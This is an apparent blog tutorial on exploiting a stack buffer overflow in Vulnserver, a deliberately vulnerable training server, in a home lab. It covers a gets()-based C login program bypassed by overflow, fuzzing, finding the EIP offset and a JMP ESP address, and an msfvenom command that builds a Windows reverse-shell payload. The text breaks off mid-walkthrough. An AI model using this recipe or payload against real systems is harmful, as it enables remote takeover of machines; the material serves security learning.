::: {}
# Stack Based Buffer Overflow Practical For Windows (Vulnserver) {#stack-based-buffer-overflow-practical-for-windows-vulnserver .p-name}
:::

::: {.section .p-summary field="subtitle"}
Vulnserver Buffer Overflow attack with TRUN command
:::

::::::::: {.section .e-content field="body"}
:::::::: {#73d0 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::::: section-content
::::: {.section-inner .sectionLayout--insetColumn}
### Stack Based Buffer Overflow Practical For Windows (Vulnserver) {#c67e .graf .graf--h3 .graf--leading .graf--title name="c67e"}

<figure id="6acc" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*gev7DdC0A4VnnxbVAc6mVA.png"
class="graf-image" data-image-id="1*gev7DdC0A4VnnxbVAc6mVA.png"
data-width="2240" data-height="1260" data-is-featured="true" />
</figure>

**Vulnserver Buffer Overflow attack with TRUN command**

Buffers are memory storage regions that temporarily hold data while it
is transferred from one location to another. A buffer overflow occurs
when the volume of data exceeds the storage capacity of the memory
buffer. As a result, the program attempting to write the data to the
buffer overwrites adjacent memory locations.

<figure id="df21" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*pZiLRpzRvZ2atopz.jpeg"
class="graf-image" data-image-id="0*pZiLRpzRvZ2atopz.jpeg"
data-width="576" data-height="231" />
</figure>

Image Credits:
[https://www.hackingtutorials.org](https://www.hackingtutorials.org/){.markup--anchor
.markup--p-anchor data-href="https://www.hackingtutorials.org/"
rel="noopener ugc nofollow noopener" target="_blank"}

It is a critical vulnerability that lets someone access your important
memory locations. A hacker can insert his malicious script and gain
access to the machine. Here is a picture that shows where a stack is
located, which will be the place of exploitation. Heap is like a
free-floating region of memory.

<figure id="89dc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ymD30fFXy-rknEDP.png"
class="graf-image" data-image-id="0*ymD30fFXy-rknEDP.png"
data-width="561" data-height="582" />
</figure>

Image Source: Google

Now let us try understanding the stack hierarchy. Stack hierarchy has
extended stack pointer (ESP), Buffer space, extended base pointer (EBP),
and extended instruction pointer (EIP).

ESP holds the top of the stack. It points to the most-recently pushed
value on the stack. A stack buffer is a temporary location created
within a computer's memory for storing and retrieving data from the
stack. EBP is the base pointer for the current stack frame. EIP is the
instruction pointer. It points to (holds the address of) the first byte
of the next instruction to be executed.

**Stack**

Stack: A LIFO data structure extensively used by computers in memory
management, etc.

There is a bunch of registers present in the memory, but we will only
concern ourselves with EIP, EBP, and ESP.

EBP: It's a stack pointer that points to the base of the stack.

ESP: It's a stack pointer that points to the top of the stack.

<figure id="67a8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_MB2s2802lCC5Pk0.png"
class="graf-image" data-image-id="0*_MB2s2802lCC5Pk0.png"
data-width="700" data-height="396" />
</figure>

EIP: It contains the address of the next instruction to be executed

<figure id="9a44" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*RvB-79qpOQyTCIlF.png"
class="graf-image" data-image-id="0*RvB-79qpOQyTCIlF.png"
data-width="875" data-height="372" />
</figure>

Imagine if we send a bunch of characters into the buffer. It should stop
taking in characters when it reaches the end. But what if the character
starts overwriting EBP and EIP? This is where a buffer overflow attack
comes into place. If we can access the EIP, we could insert malicious
scripts to gain control of the computer.

**Let's see some important points related to the stack:**

A stack is filled from higher memory to lower memory.\
In a stack, all the variables are accessed relative to the EBP.\
In a program, every function has its own stack.\
Everything is referenced from the EBP register.

There are 4 main components of the memory stack in a 32-bit architecture
-

Extended Stack Pointer (**ESP**)\
Buffer Space\
Extended Base Pointer (**EBP**)\
Extended Instruction Pointer (**EIP**) / Return Address

### Definitions: {#1f7c .graf .graf--h3 .graf-after--p name="1f7c"}

1.  [**EIP =\>**The Extended Instruction Pointer (EIP) is a register
    that contains the address of the next instruction for the program or
    command.]{#0042}
2.  [**ESP=\>**The Extended Stack Pointer (ESP) is a register that lets
    you know where on the stack you are and allows you to push data in
    and out of the application.]{#0b09}
3.  [**JMP =\>**The Jump (JMP) is an instruction that modifies the flow
    of execution where the operand you designate will contain the
    address being jumped to.]{#8bf4}
4.  [**\\x41, \\x42, \\x43 =\>**The hexadecimal values for A, B and C.
    For this exercise, there is no benefit to using hex vs ascii, it's
    just my personal preference.]{#d579}

<figure id="8784" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/0*Imlu57XwReIcsCk2.png"
class="graf-image" data-image-id="0*Imlu57XwReIcsCk2.png"
data-width="768" data-height="280" />
</figure>

For now, we will only to be concerned with 'Buffer Space' and the 'EIP'.

Buffer space is used as a storage area for memory in programming
languages. For security reasons, information placed into the buffer
space should never travel outside the buffer space

<figure id="8318" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*NRer4J6_YrnZzHus.jpeg"
class="graf-image" data-image-id="0*NRer4J6_YrnZzHus.jpeg"
data-width="768" data-height="280" />
</figure>

In the above figure, consider that a number of A's (0x41) were sent to
the buffer space, but were correctly sanitized. The A's did not travel
outside the buffer space and thus, no buffer overflow occurred.

Now, looking at a buffer overflow -

<figure id="56df" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*eYbZixcNzKwU0L8u.jpeg"
class="graf-image" data-image-id="0*eYbZixcNzKwU0L8u.jpeg"
data-width="768" data-height="280" />
</figure>

In the above figure, the number of A's (0x41) that were sent to the
buffer space, have traveled outside the buffer space and have reached
till the EIP.

If an attacker can gain control of the EIP, he or she can use the
pointer to point to some malicious code and compromise a system. We are
going to demonstrate how to do it.

**Types of Buffer Overflow Attacks**

Stack-based buffer overflows are more common, and leverage stack memory
that only exists during the execution time of a function.

Heap-based attacks are harder to carry out and involve flooding the
memory space allocated for a program beyond memory used for current
runtime operations.

**What Programming Languages are More Vulnerable?**

C and C++ are two languages that are highly susceptible to buffer
overflow attacks, as they don't have built-in safeguards against
overwriting or accessing data in their memory. Mac OSX, Windows, and
Linux all use code written in C and C++.

Languages such as PERL, Java, JavaScript, and C# use built-in safety
mechanisms that minimize the likelihood of buffer overflow.

**How to Prevent Buffer Overflows**

Developers can protect against buffer overflow vulnerabilities via
security measures in their code, or by using languages that offer
built-in protection.

In addition, modern operating systems have runtime protection. Three
common protections are:

**Address space randomization (ASLR)** --- randomly moves around the
address space locations of data regions. Typically, buffer overflow
attacks need to know the locality of executable code, and randomizing
address spaces makes this virtually impossible.

**Data execution prevention** --- flags certain areas of memory as
non-executable or executable, which stops an attack from running code in
a non-executable region.

**Structured exception handler overwrite protection (SEHOP)** --- helps
stop malicious code from attacking Structured Exception Handling (SEH),
a built-in system for managing hardware and software exceptions. It thus
prevents an attacker from being able to make use of the SEH overwrite
exploitation technique. At a functional level, an SEH overwrite is
achieved using a stack-based buffer overflow to overwrite an exception
registration record, stored on a thread's stack.

### Lets Take an Example How Buffer Overflow Work with Simple C program {#f958 .graf .graf--h3 .graf-after--p name="f958"}

``` {#6b81 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
#include<stdio.h>
#include<string.h>int main(void)
{
    char buff[15];
    int pass = 0;printf("\n Enter the password : \n");
    gets(buff);if(strcmp(buff, "mrsam"))
    {
        printf("\n Wrong Password \n");
    }
    else
    {
        printf("\n Correct Password \n");
        pass = 1;
    }if(pass)
    {
       /* Now Give root or admin rights to user*/
        printf("\n Root privileges given to the user \n");
        char command[50];
        strcpy( command, "ls -l" );
        system(command);
    }return 0;
}
```

This is simple Login system program the correct password of this program
is **mrsam**

compile your code

``` {#e703 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
gcc program.c -o program
```

<figure id="1e35" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*60Fgu1S3YjEY2TbQ.png"
class="graf-image" data-image-id="0*60Fgu1S3YjEY2TbQ.png"
data-width="561" data-height="617" />
</figure>

as you can when give correct password=**mrsam** it will run "**ls -l**"

command

Now run this program again with wrong password

<figure id="3f24" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0fzV5zEdUhngadZl.png"
class="graf-image" data-image-id="0*0fzV5zEdUhngadZl.png"
data-width="339" data-height="194" />
</figure>

When i enter wrong password the program not running "**ls -l**" command

Now run this program again with wrong password with more then character

<figure id="a1c1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*nAmGvCSkMTgg4dEs.png"
class="graf-image" data-image-id="0*nAmGvCSkMTgg4dEs.png"
data-width="613" data-height="315" />
</figure>

In the above example, even after entering a wrong password, the program
worked as you gave the correct password.

There is a logic behind the output above. What attacker did was, he/she
supplied an input of length greater than what buffer can hold and at a
particular length of input the buffer overflow so took place that it
overwrote the memory of integer 'pass'. So despite of a wrong password,
the value of 'pass' became non zero and hence root privileges were
granted to an attacker.

### What is Vulnserver? {#14cc .graf .graf--h3 .graf-after--p name="14cc"}

Vulnserver was created for learning software exploitation. It is a
multi-threaded Windows based TCP server that listens for client
connections on port 9999 (by default) and allows the user to run a
number of different commands that are vulnerable to various types of
buffer overflow exploiations. The source code can be found
[here](https://github.com/stephenbradshaw/vulnserver){.markup--anchor
.markup--p-anchor
data-href="https://github.com/stephenbradshaw/vulnserver"
rel="noopener ugc nofollow noopener" target="_blank"}.

::: {#957a .graf .graf--mixtapeEmbed .graf-after--p}
[**GitHub - stephenbradshaw/vulnserver: Vulnerable server used for
learning software exploitation**\
*Vulnerable server used for learning software exploitation -
stephenbradshaw/vulnserver*github.com](https://github.com/stephenbradshaw/vulnserver?source=post_page-----8d2be7321af5-------------------------------- "https://github.com/stephenbradshaw/vulnserver?source=post_page-----8d2be7321af5--------------------------------"){.markup--anchor
.markup--mixtapeEmbed-anchor
data-href="https://github.com/stephenbradshaw/vulnserver?source=post_page-----8d2be7321af5--------------------------------"}[](https://github.com/stephenbradshaw/vulnserver?source=post_page-----8d2be7321af5--------------------------------){.js-mixtapeImage
.mixtapeImage .u-ignoreBlock media-id="3757785d8f84a3dd27b4954072080c91"
thumbnail-img-id="0*uVyy_iTVDUvqEeEa"
style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*uVyy_iTVDUvqEeEa);"}
:::

[https://www.immunityinc.com/products/debugger/?source=post_page\-\-\-\--8d2be7321af5\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--](https://www.immunityinc.com/products/debugger/?source=post_page-----8d2be7321af5--------------------------------){.markup--anchor
.markup--p-anchor
data-href="https://www.immunityinc.com/products/debugger/?source=post_page-----8d2be7321af5--------------------------------"
rel="nofollow noopener" target="_blank"}

**Tools/OS used :**

``` {#f79d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
Attacker Machine : Kali Linux Rolling
Victim Host : Windows 7 ultimate 32 bit
Vulnserver application (github)
Immunity Debugger v1.85
```

**NOTES :-**

``` {#0be9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
Attacker’s IP : 192.168.43.73
Victim’s IP : 192.168.43.112
Vulnerable port : 9999 ( Vulnserver )
Vulnerable parameter : TRUN
```

**EASY STEPS**

**Part 1**

1.  [Fuzzing the service parameter and getting the crash byte]{#ec82}
2.  [Generating the pattern]{#9ff2}
3.  [Finding the correct offset where the byte crashes with the help of
    (EIP)]{#ba73}

**Part 2**

1.  [Finding the bad character with mona.py, and comparing bad character
    strings with mona.py]{#3539}
2.  [Finding return address (JMP ESP) with mona.py]{#f432}

**Part 3**

1.  [Setting breakpoint to verify RETURN address is correct or
    not]{#e4cc}
2.  [Creating reverse shell with the help of msfvenom]{#9581}
3.  [Adding NOP's to the script]{#9c28}
4.  [Getting shell]{#af49}

Right click on vulnserver run as Administrator by default vulnserver is
running on port 9999

<figure id="cb02" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*atRycr8p2mPrtDsO.png"
class="graf-image" data-image-id="0*atRycr8p2mPrtDsO.png"
data-width="802" data-height="464" />
</figure>

<figure id="afad" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Y8H-VNdZCRTpDI2S.png"
class="graf-image" data-image-id="0*Y8H-VNdZCRTpDI2S.png"
data-width="612" data-height="384" />
</figure>

so you can see that above image vulnserver is running on port 9999

### Fuzzing {#9dc6 .graf .graf--h3 .graf-after--p name="9dc6"}

The first step in testing for a buffer overflow is fuzzing.\
Fuzzing allows us to send bytes of data to a vulnerable program (in our
case, Vulnserver) in growing iterations, to overflow the buffer space
and overwrite the EIP.

<figure id="715c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*tCKioatPpxZp4Hj9.png"
class="graf-image" data-image-id="0*tCKioatPpxZp4Hj9.png"
data-width="460" data-height="409" />
</figure>

From here we see the commands that are available to us. Here's where
things are going to get interesting, we're going to fuzz some commands
to find out where it crashes. I'm going to use the TRUN command, though
any of the commands are viable test subjects

<figure id="ff3b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qhkUSiZ8tWroUKhU.png"
class="graf-image" data-image-id="0*qhkUSiZ8tWroUKhU.png"
data-width="385" data-height="271" />
</figure>

So this is manual Fuzzing it will take long time to crash the program

So here we will use Python Script

Now, let's write a simple Python fuzzing script on our Linux machine
[**fuzzing.py**](https://github.com/shamsherkhan852/Buffer-Overflow-tools){.markup--anchor
.markup--p-anchor
data-href="https://github.com/shamsherkhan852/Buffer-Overflow-tools"
rel="noopener ugc nofollow noopener" target="_blank"} Download from

<figure id="0809" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bmZqyf-cHYmPMsMN.png"
class="graf-image" data-image-id="0*bmZqyf-cHYmPMsMN.png"
data-width="626" data-height="368" />
</figure>

It should be noted that the IP in the s.connect() will be of the Windows
machine that is running Vulnserver and it runs on port 9999 by default,
and the vulnerability we are attacking is through the "TRUN" command.

Now, in Immunity Debugger click on 'File' \> and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

<figure id="5c5f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*cw7TUJuKcqQVBjrw.png"
class="graf-image" data-image-id="0*cw7TUJuKcqQVBjrw.png"
data-width="875" data-height="486" />
</figure>

<figure id="a107" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*VH2O2JDUDyJty7J2.png"
class="graf-image" data-image-id="0*VH2O2JDUDyJty7J2.png"
data-width="335" data-height="81" />
</figure>

<figure id="333b" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*qGl3U2e2u0uIjagL.png"
class="graf-image" data-image-id="0*qGl3U2e2u0uIjagL.png"
data-width="181" data-height="82" />
</figure>

<figure id="97f9" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*8vCC-LdyqAtRhqoB.png"
class="graf-image" data-image-id="0*8vCC-LdyqAtRhqoB.png"
data-width="434" data-height="547" />
</figure>

Wait till the program crashes and you see the 'Paused' status at the
bottom right of Immunity Debugger.

In my case, vulnserver crashed after 5900 bytes. Also, not all registers
were overwritten by 'A' (0x41), and that's not a problem unless the
program has crashed. We now have a general idea of sending data to crash
the program. See the Image below

<figure id="8aec" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*srH8WuVl4gj3FKWB.png"
class="graf-image" data-image-id="0*srH8WuVl4gj3FKWB.png"
data-width="664" data-height="582" />
</figure>

What we need to do next is figure out exactly where the EIP is located
(in bytes) and try to get control over it.

### Finding the Offset {#7ddb .graf .graf--h3 .graf-after--p name="7ddb"}

So, now that we know how we can overwrite the EIP and that the overwrite
occurred between 1 and 5900 bytes- .

We use 2 Ruby tools : 'Pattern Create' and 'Pattern Offset' to find the
exact location of the overwrite.

Pattern Create allows us to generate some amount of bytes, based on the
number of bytes specified. We can then send those bytes to Vulnserver
instead of A's, and try to find exactly where we overwrote the EIP.
Pattern Offset will help us determine the location of the overwrite
soon.

In Kali, by default, these tools are located in the
/usr/share/metasploit-framework/tools/exploit folder.

<figure id="b48f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*NAMGtZUo46979Q2M.png"
class="graf-image" data-image-id="0*NAMGtZUo46979Q2M.png"
data-width="875" data-height="267" />
</figure>

We will write a new **offest-value.py** and create a new variable
'shellcode' containing the string generated above.

[**Download
offset_value.py**](https://github.com/shamsherkhan852/Buffer-Overflow-tools){.markup--anchor
.markup--p-anchor
data-href="https://github.com/shamsherkhan852/Buffer-Overflow-tools"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="20fb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-suCe8a5syED668h.png"
class="graf-image" data-image-id="0*-suCe8a5syED668h.png"
data-width="813" data-height="376" />
</figure>

We just need to send this code only once.

Now, in Immunity Debugger click on 'File' \> and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

<figure id="4eac" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*FSHBw3crJz86F9s9.png"
class="graf-image" data-image-id="0*FSHBw3crJz86F9s9.png"
data-width="546" data-height="98" />
</figure>

<figure id="f963" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*9iX3qszNhNjlCOvB.png"
class="graf-image" data-image-id="0*9iX3qszNhNjlCOvB.png"
data-width="669" data-height="393" />
</figure>

Observing the **EIP** register -'**386F4337**'. This value is actually
part of our script that we generated using the Pattern Create tool.

To find out the location we will be using Pattern Offset tool.

<figure id="dddb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uxel6sKEDklDoAr3.png"
class="graf-image" data-image-id="0*uxel6sKEDklDoAr3.png"
data-width="547" data-height="80" />
</figure>

Well, we now know the exact location from where the EIP begins and we
can now try to control the EIP, which will be very useful in our
exploit.

We will now move on to Overwriting the EIP.

Overwriting the EIP

Now that we know the EIP starts at 2003 bytes, we can modify our code to
confirm that.

It will be like a 'trial-and-error' and a 'proof of concept' kind.

We will first send 2003 'A's and then send 4 'B's (since EIP is 4 bytes
in size).

I hope you all get what we are doing here. Request you all to have a
little patience and you will make it through.

The 2003 A's will just reach (kiss) the EIP but won't overwrite the EIP
but the B's should overwrite the EIP.

We are just testing it's range to be doubly sure. That's it.

Writing a new python script:-
[**OverwriteEIP.py**](https://github.com/shamsherkhan852/Buffer-Overflow-tools){.markup--anchor
.markup--p-anchor
data-href="https://github.com/shamsherkhan852/Buffer-Overflow-tools"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="83b0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TwdoGll-hxf5vSJI.png"
class="graf-image" data-image-id="0*TwdoGll-hxf5vSJI.png"
data-width="813" data-height="394" />
</figure>

Now, in Immunity Debugger click on 'File' \> and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

<figure id="33b1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Ctif5QLLGG5n-5pF.png"
class="graf-image" data-image-id="0*Ctif5QLLGG5n-5pF.png"
data-width="547" data-height="83" />
</figure>

<figure id="bc6c" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*e_goUemQICAee4vQ.png"
class="graf-image" data-image-id="0*e_goUemQICAee4vQ.png"
data-width="675" data-height="409" />
</figure>

Observe that, our EIP has the value '42424242' just like we wanted.

Now we will find out which characters are considered as 'bad characters'
by the Vulnserver application.

By default, the null byte(x00) is always considered a bad character as
it will truncate the shellcode when executed.

**Finding the Bad Characters**

Some characters cause issues in the exploit development. We must run
every byte (0--255 in value because 1 byte's range is 0--255) through
the Vulnserver program to see if any characters cause issues.

We already know that the null byte(x00) is always considered a bad
character by default.

To find bad characters in Vulnserver, add an additional variable
'badchars' to our code that contains a list of every single hexadecimal
character, except \\x00.

Lets generate Badchars

<figure id="3430" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*MRsnT_DadRwyduv6.png"
class="graf-image" data-image-id="0*MRsnT_DadRwyduv6.png"
data-width="639" data-height="570" />
</figure>

Feel free to use the above snippet in your code.

Copying the OverwriteEIP.py for backup and creating a new file
badchars.py.

Download
[**badchars.py**](https://github.com/shamsherkhan852/Buffer-Overflow-tools){.markup--anchor
.markup--p-anchor
data-href="https://github.com/shamsherkhan852/Buffer-Overflow-tools"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="2275" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*B3fXur1TuAEE3Z4M.png"
class="graf-image" data-image-id="0*B3fXur1TuAEE3Z4M.png"
data-width="646" data-height="536" />
</figure>

Now, in Immunity Debugger click on 'File' \> and select vulnserver.exe.

Run the vulnserver.exe program by clicking the play button.

<figure id="ac4a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lFj0QETk0wvIImbO.png"
class="graf-image" data-image-id="0*lFj0QETk0wvIImbO.png"
data-width="538" data-height="87" />
</figure>

<figure id="eff3" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Olv6b12zw2Y9cMU9.png"
class="graf-image" data-image-id="0*Olv6b12zw2Y9cMU9.png"
data-width="672" data-height="333" />
</figure>

Right click on the ESP register and select "Follow in Dump"

<figure id="0269" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*8ifFi3fTqJrs7C5o.png"
class="graf-image" data-image-id="0*8ifFi3fTqJrs7C5o.png"
data-width="774" data-height="470" />
</figure>

<figure id="10b6" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*7Q4uQVxHhrtwok3K.png"
class="graf-image" data-image-id="0*7Q4uQVxHhrtwok3K.png"
data-width="418" data-height="534" />
</figure>

If a bad character is present, it would immediately seem out of place.
But in our case, there are no bad characters in the Vulnserver
application.

Observing how neat and perfect is the order of characters. They end at
0xFF.

The great thing about the vulnserver.exe is that only the null byte
(0x00) is a bad character.

**Finding the right module.**

Finding the right module means that we need to find some part of
Vulnserver that does not have any sort of memory protections. We will
use 'mona modules' to find it.

::: {#c235 .graf .graf--mixtapeEmbed .graf-after--p}
[**GitHub - corelan/mona: Corelan Repository for mona.py**\
*Corelan Repository for mona.py. Contribute to corelan/mona development
by creating an account on
GitHub.*github.com](https://github.com/corelan/mona?source=post_page-----8d2be7321af5-------------------------------- "https://github.com/corelan/mona?source=post_page-----8d2be7321af5--------------------------------"){.markup--anchor
.markup--mixtapeEmbed-anchor
data-href="https://github.com/corelan/mona?source=post_page-----8d2be7321af5--------------------------------"}[](https://github.com/corelan/mona?source=post_page-----8d2be7321af5--------------------------------){.js-mixtapeImage
.mixtapeImage .u-ignoreBlock media-id="7b04c5538675238f946ae9446583b5d3"
thumbnail-img-id="0*CpPbpY1GLR821ikO"
style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*CpPbpY1GLR821ikO);"}
:::

Download mona.py and paste this file that path

<figure id="f7c5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*X_bN01jUIxVWcves.png"
class="graf-image" data-image-id="0*X_bN01jUIxVWcves.png"
data-width="760" data-height="198" />
</figure>

Reopen Vulnserver and Immunity Debugger as admin. don't play server

In the bottom search bar on Immunity enter -

**!mona modules**

<figure id="a477" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ICcb4Ge7x1z_KY9w.png"
class="graf-image" data-image-id="0*ICcb4Ge7x1z_KY9w.png"
data-width="875" data-height="378" />
</figure>

A table will appear having weird numbers all in Green.

Look for 'False' across the table. That means there are no memory
protections present in that module.

'**essfunc.dll**' is running as part of Vulnserver and has no memory
protections. Making a note of it.

Now we will find the opcode equivalent of JMP ESP. We are using JMP ESP
because our EIP will point to the JMP ESP location, which will jump to
our malicious shellcode that we will inject later.

### Finding Hex Codes for Useful instruction {#d7c3 .graf .graf--h3 .graf-after--p name="d7c3"}

Kali Linux contains a handy utility for converting assembly language to
hex codes.

In Kali Linux, in a Terminal window, execute this command:

> ***`locate nasm_shell`{.markup--code .markup--blockquote-code}***

<figure id="1f99" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*PiqCMCP_QPcGwooQ.png"
class="graf-image" data-image-id="0*PiqCMCP_QPcGwooQ.png"
data-width="590" data-height="210" />
</figure>

The hexadecimal code for a "JMP ESP" instruction is FFE4.

Now we will find the pointer address using this information. We will
place this pointer address into the EIP to point to our malicious
shellcode.

In our Immunity searchbar enter -

> ***!mona find -s "\\xff\\xe4" -m essfunc.dll***

``` {#9a47 .graf .graf--pre .graf-after--blockquote .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="vbnet"}
where -s  is the byte string to search for, and -m  specifies the module to search in
```

It shows all possible right module

<figure id="a4d1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*g9AL--shJTaxgz4_.png"
class="graf-image" data-image-id="0*g9AL--shJTaxgz4_.png"
data-width="628" data-height="298" />
</figure>

We found 9 locations in memory (that won't change addresses when we
restart program) that hold the instruction 'JMP ESP'.

It's a list of addresses that we can potentially use as our pointer. The
addresses are located on the left side, in white.

We will select the first address -**625011AF** and add it to our Python
script shell.py

Note 1 : your address may be different depending on the version of
Windows you are running. So, do not panic if the addresses are not the
same!

The address will be in hex -

**\\xaf\\x11\\x50\\x62**

Try one by one (copy first address=625011af) immunity. click on black
right arrow \>:

<figure id="b5fa" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WOw3InK5IrCm8Owe.png"
class="graf-image" data-image-id="0*WOw3InK5IrCm8Owe.png"
data-width="675" data-height="333" />
</figure>

Paste 625011af and ok

right click on 625011AF breakpoint\>toggle

<figure id="2ecc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*U2yyOuXV1Om9FK0u.png"
class="graf-image" data-image-id="0*U2yyOuXV1Om9FK0u.png"
data-width="603" data-height="375" />
</figure>

now play server

Downlaod
[**find_right_module.py**](https://github.com/shamsherkhan852/Buffer-Overflow-tools){.markup--anchor
.markup--p-anchor
data-href="https://github.com/shamsherkhan852/Buffer-Overflow-tools"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="a907" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dvqJ4BEuQbeh6dNP.png"
class="graf-image" data-image-id="0*dvqJ4BEuQbeh6dNP.png"
data-width="731" data-height="343" />
</figure>

<figure id="9a4c" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*OQNHF-EzJfCj0AcW.png"
class="graf-image" data-image-id="0*OQNHF-EzJfCj0AcW.png"
data-width="542" data-height="79" />
</figure>

(it show our copied address on EIP)

<figure id="e492" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*S8jnDc5cxqhS5hbg.png"
class="graf-image" data-image-id="0*S8jnDc5cxqhS5hbg.png"
data-width="646" data-height="265" />
</figure>

if EIP show our copied address then it is right module

**Note 2** : This will look a little weird. This is a 32-bit
application. That means that the system is using x86's architecture
format of "Little Endian", or in other words, "Least significant byte
first." We have to use the Little Endian format in x86 architecture
because the low-order byte is stored in the memory at the lowest address
and the high-order byte is stored at the highest address.

### Generating reverse shell payload - {#28b0 .graf .graf--h3 .graf-after--p name="28b0"}

``` {#9621 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.72 LPORT=1234 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c
```

<figure id="9780" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*oGCgKG-4blCIStPt.png"
class="graf-image" data-image-id="0*oGCgKG-4blCIStPt.png"
data-width="875" data-height="415" />
</figure>

Download
[**exploit.py**](https://github.com/shamsherkhan852/Buffer-Overflow-tools){.markup--anchor
.markup--p-anchor
data-href="https://github.com/shamsherkhan852/Buffer-Overflow-tools"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="66a2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*v_Z50cmvxKEEWBPN.png"
class="graf-image" data-image-id="0*v_Z50cmvxKEEWBPN.png"
data-width="578" data-height="617" />
</figure>

According to TCM --- we must create a variable called 'exploit' and
place the malicious shellcode inside of it. We must also add '**32 \*
\\x90**' to the shellcode variable (32 \\x90 bytes). This is standard
practice. The 0x90 byte is also known as the NOP, or no operation. It
literally does nothing. However, when developing exploits, we can use it
as padding. There are instances where our exploit code can interfere
with our return address and not run properly. To avoid this
interference, we can add some padding in-between the two items.

Start nc listener on same port mentioned during creation of the
payload --- 1234.

<figure id="a7f9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*b_munxABh_SgkSVh.png"
class="graf-image" data-image-id="0*b_munxABh_SgkSVh.png"
data-width="545" data-height="107" />
</figure>

Restart vulnserver(CTRL+F2) and play server(F9)

Execute shell.py in a new terminal tab.

<figure id="9145" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*l4GN2MEQFw1HxwMK.png"
